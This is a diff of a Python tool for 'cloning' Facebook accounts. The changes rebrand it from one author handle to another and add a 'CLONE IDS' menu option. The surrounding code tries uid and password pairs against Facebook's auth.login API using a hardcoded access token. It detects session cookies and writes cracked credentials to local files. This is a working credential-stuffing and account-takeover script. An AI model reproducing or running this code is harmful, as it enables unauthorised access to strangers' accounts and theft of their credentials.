@@ -391,16 +391,16 @@ logo = ("""\033[1;32m
 
 
 
-\033[1;32mNAM TO SUNA HOGA ALIYAN
+\033[1;32mNAM TO SUNA HOGA NANO AFR
 \033[;33mCLEAR FECBOOK DATA TO OEPN CP ID JUST NOW
 \033[;32mMAZA NA AYE PASSY WAPIS 😁🖕
         
  
 ••••••••••••••••••••••••••••••••••••••••••••••••••\033[1;33m
-  \033[1;32mAuther  : ALIYAN TRICKER
-  \033[1;33mYouTube : ALIYAN TRICKER
-  \033[1;32mFecbook : ALIYAN TRICKER
-   \033[1;33m Admin. : ALIYAN TRICKER
+  \033[1;32mAuther  : NANO AFR TRICKER
+  \033[1;33mYouTube : NANO AFR TRICKER
+  \033[1;32mFecbook : NANO AFR TRICKER
+   \033[1;33m Admin.: NANO AFR TRICKER
 ••••••••••••••••••••••••••••••••••••••••••••••••••\033[1;32m""")
 
 class Main:
@@ -416,7 +416,7 @@ class Main:
 		print("")
 		print("\033[1;32m [1] First You Subscribe Channel")
 		print("\033[1;33m [2] Exit")
-		print("")
+		print("\033[1;32m [3] CLONE IDS")
 		ALIYAN = input("\n\033[1;36m  Chose ==> \033[1;32m")
 		if ALIYAN in ["", " "]:
 			exit()
@@ -1299,13 +1299,13 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[0;92m[ ALIYAN-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ NANO AFR-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats Bro ")
 				self.ok.append("%s|%s"%(uid, pw))
 				open("2009-ALIYAN-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[0;92m[ ALIYAN-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ NANO AFR-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
 				open("2009-ALIYAN-OK.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
@@ -1332,8 +1332,8 @@ def Subscraption():
 		os.system("clear")
 		print(logo)
 		print ("")
-		print(" \033[1;32m ALIYAN Toll Free BUT You Need Get Approved First\033[1;37m\n")
-		print(" \033[1;32m Note : ALIYAN FREE HA BHAIYO ENJOYA   \033[1;37m")
+		print(" \033[1;32m NANO AFR Toll Free BUT You Need Get Approved First\033[1;37m\n")
+		print(" \033[1;32m Note : NANO AFR FREE HA BHAIYO ENJOYA   \033[1;37m")
 		print ("")
 		print(" Your Key is Not Approved ")
 		print("")
